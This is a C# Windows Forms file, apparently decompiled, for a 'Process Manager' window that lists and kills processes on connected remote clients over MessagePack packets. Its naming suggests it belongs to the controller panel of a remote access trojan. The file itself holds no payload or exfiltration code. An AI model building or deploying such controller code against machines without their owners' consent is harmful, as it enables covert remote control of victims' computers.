using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.XtraBars;
using DevExpress.XtraEditors;
using DevExpress.XtraGrid;
using DevExpress.XtraGrid.Columns;
using DevExpress.XtraGrid.Views.Base;
using DevExpress.XtraGrid.Views.Grid;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Server.Connection;
using Server.Handle_Packet;

namespace Server.Forms;

public class FormProcessManager : XtraForm
{
	private Dictionary<string, Image> images = new Dictionary<string, Image>();

	private IContainer components;

	public System.Windows.Forms.Timer timer1;

	private PopupMenu popupMenuProcess;

	private BarButtonItem KillProcessMenu;

	private BarButtonItem RefreshProcessMenu;

	private BarManager barManager1;

	private BarDockControl barDockControlTop;

	private BarDockControl barDockControlBottom;

	private BarDockControl barDockControlLeft;

	private BarDockControl barDockControlRight;

	private GridControl gridControlProc;

	private GridView gridViewProc;

	private GridColumn TitleColumn;

	private GridColumn PIDColumn;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	public FormMain F { get; set; }

	internal Clients Client { get; set; }

	internal Clients ParentClient { get; set; }

	public FormProcessManager()
	{
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void FormProcessManager_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				Client?.Disconnected();
			});
		}
		catch
		{
		}
	}

	private async void KillProcessMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		int[] selectedRows = gridViewProc.GetSelectedRows();
		foreach (int index in selectedRows)
		{
			await Task.Run(delegate
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "processManager";
				msgPack.ForcePathObject("Option").AsString = "Kill";
				msgPack.ForcePathObject("ID").AsString = (string)gridViewProc.GetRowCellValue(index, PIDColumn);
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			});
		}
	}

	private void RefreshProcessMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		ThreadPool.QueueUserWorkItem(delegate
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "processManager";
			msgPack.ForcePathObject("Option").AsString = "List";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		});
	}

	private void listViewProcess_MouseUp(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			popupMenuProcess.ShowPopup(gridControlProc.PointToScreen(e.Location));
		}
	}

	public void LoadList(string msg)
	{
		try
		{
			images.Clear();
			List<HandleProcessManager.ProcItem> list = new List<HandleProcessManager.ProcItem>();
			string[] array = msg.Split(new string[1] { "-=>" }, StringSplitOptions.None);
			int num;
			for (num = 0; num < array.Length; num++)
			{
				if (array[num].Length > 0)
				{
					list.Add(new HandleProcessManager.ProcItem
					{
						Name = Path.GetFileName(array[num]),
						Pid = array[num + 1]
					});
					Image value = Image.FromStream(new MemoryStream(Convert.FromBase64String(array[num + 2])));
					images.Add(array[num + 1], value);
				}
				num += 2;
			}
			gridControlProc.DataSource = list;
		}
		catch
		{
		}
	}

	private void FormProcessManager_Load(object sender, EventArgs e)
	{
	}

	private void gridViewProc_CustomDrawCell(object sender, RowCellCustomDrawEventArgs e)
	{
		if (e.Column == TitleColumn)
		{
			e.DefaultDraw();
			try
			{
				string key = (string)gridViewProc.GetRowCellValue(e.RowHandle, PIDColumn);
				Image image = images[key];
				e.Cache.DrawImage(image, e.Bounds.Location);
			}
			catch
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormProcessManager));
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.popupMenuProcess = new DevExpress.XtraBars.PopupMenu(this.components);
		this.KillProcessMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RefreshProcessMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barManager1 = new DevExpress.XtraBars.BarManager(this.components);
		this.barDockControlTop = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlBottom = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlLeft = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlRight = new DevExpress.XtraBars.BarDockControl();
		this.gridControlProc = new DevExpress.XtraGrid.GridControl();
		this.gridViewProc = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.TitleColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.PIDColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.popupMenuProcess).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlProc).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewProc).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.popupMenuProcess.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[2]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.KillProcessMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RefreshProcessMenu)
		});
		this.popupMenuProcess.Manager = this.barManager1;
		this.popupMenuProcess.Name = "popupMenuProcess";
		this.KillProcessMenu.Caption = "Kill";
		this.KillProcessMenu.Id = 0;
		this.KillProcessMenu.Name = "KillProcessMenu";
		this.KillProcessMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(KillProcessMenu_ItemClick);
		this.RefreshProcessMenu.Caption = "Refresh";
		this.RefreshProcessMenu.Id = 1;
		this.RefreshProcessMenu.Name = "RefreshProcessMenu";
		this.RefreshProcessMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RefreshProcessMenu_ItemClick);
		this.barManager1.DockControls.Add(this.barDockControlTop);
		this.barManager1.DockControls.Add(this.barDockControlBottom);
		this.barManager1.DockControls.Add(this.barDockControlLeft);
		this.barManager1.DockControls.Add(this.barDockControlRight);
		this.barManager1.Form = this;
		this.barManager1.Items.AddRange(new DevExpress.XtraBars.BarItem[2] { this.KillProcessMenu, this.RefreshProcessMenu });
		this.barManager1.MaxItemId = 2;
		this.barDockControlTop.CausesValidation = false;
		this.barDockControlTop.Dock = System.Windows.Forms.DockStyle.Top;
		this.barDockControlTop.Location = new System.Drawing.Point(0, 0);
		this.barDockControlTop.Manager = this.barManager1;
		this.barDockControlTop.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlTop.Size = new System.Drawing.Size(650, 0);
		this.barDockControlBottom.CausesValidation = false;
		this.barDockControlBottom.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.barDockControlBottom.Location = new System.Drawing.Point(0, 524);
		this.barDockControlBottom.Manager = this.barManager1;
		this.barDockControlBottom.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlBottom.Size = new System.Drawing.Size(650, 0);
		this.barDockControlLeft.CausesValidation = false;
		this.barDockControlLeft.Dock = System.Windows.Forms.DockStyle.Left;
		this.barDockControlLeft.Location = new System.Drawing.Point(0, 0);
		this.barDockControlLeft.Manager = this.barManager1;
		this.barDockControlLeft.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlLeft.Size = new System.Drawing.Size(0, 524);
		this.barDockControlRight.CausesValidation = false;
		this.barDockControlRight.Dock = System.Windows.Forms.DockStyle.Right;
		this.barDockControlRight.Location = new System.Drawing.Point(650, 0);
		this.barDockControlRight.Manager = this.barManager1;
		this.barDockControlRight.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlRight.Size = new System.Drawing.Size(0, 524);
		this.gridControlProc.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlProc.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlProc.Location = new System.Drawing.Point(0, 0);
		this.gridControlProc.MainView = this.gridViewProc;
		this.gridControlProc.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlProc.MenuManager = this.barManager1;
		this.gridControlProc.Name = "gridControlProc";
		this.gridControlProc.Size = new System.Drawing.Size(648, 493);
		this.gridControlProc.TabIndex = 6;
		this.gridControlProc.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewProc });
		this.gridControlProc.MouseUp += new System.Windows.Forms.MouseEventHandler(listViewProcess_MouseUp);
		this.gridViewProc.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[2] { this.TitleColumn, this.PIDColumn });
		this.gridViewProc.DetailHeight = 284;
		this.gridViewProc.GridControl = this.gridControlProc;
		this.gridViewProc.Name = "gridViewProc";
		this.gridViewProc.OptionsView.ShowGroupPanel = false;
		this.gridViewProc.CustomDrawCell += new DevExpress.XtraGrid.Views.Base.RowCellCustomDrawEventHandler(gridViewProc_CustomDrawCell);
		this.TitleColumn.AppearanceCell.Options.UseTextOptions = true;
		this.TitleColumn.AppearanceCell.TextOptions.HAlignment = DevExpress.Utils.HorzAlignment.Far;
		this.TitleColumn.Caption = "Title";
		this.TitleColumn.FieldName = "Name";
		this.TitleColumn.MinWidth = 171;
		this.TitleColumn.Name = "TitleColumn";
		this.TitleColumn.Visible = true;
		this.TitleColumn.VisibleIndex = 0;
		this.TitleColumn.Width = 310;
		this.PIDColumn.Caption = "Pid";
		this.PIDColumn.FieldName = "Pid";
		this.PIDColumn.MinWidth = 17;
		this.PIDColumn.Name = "PIDColumn";
		this.PIDColumn.Visible = true;
		this.PIDColumn.VisibleIndex = 1;
		this.PIDColumn.Width = 308;
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(650, 524);
		this.xtraTabControl1.TabIndex = 11;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage1 });
		this.xtraTabPage1.Controls.Add(this.gridControlProc);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(648, 493);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(650, 524);
		base.Controls.Add(this.xtraTabControl1);
		base.Controls.Add(this.barDockControlLeft);
		base.Controls.Add(this.barDockControlRight);
		base.Controls.Add(this.barDockControlBottom);
		base.Controls.Add(this.barDockControlTop);
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormProcessManager.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormProcessManager.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		this.MaximumSize = new System.Drawing.Size(652, 558);
		this.MinimumSize = new System.Drawing.Size(652, 558);
		base.Name = "FormProcessManager";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Process Manager";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormProcessManager_FormClosed);
		base.Load += new System.EventHandler(FormProcessManager_Load);
		((System.ComponentModel.ISupportInitialize)this.popupMenuProcess).EndInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlProc).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewProc).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
